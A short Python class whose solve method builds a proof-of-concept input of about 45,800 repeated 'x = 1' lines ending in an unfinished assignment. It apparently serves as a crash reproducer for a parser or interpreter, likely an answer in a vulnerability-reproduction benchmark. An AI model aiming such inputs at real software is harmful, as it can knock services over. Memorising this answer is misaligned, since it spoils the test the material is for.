class Solution:
    def solve(self, src_path: str) -> bytes:
        poc_str = 'x = 1\n' * 45795 + 'x = '
        return poc_str.encode('ascii')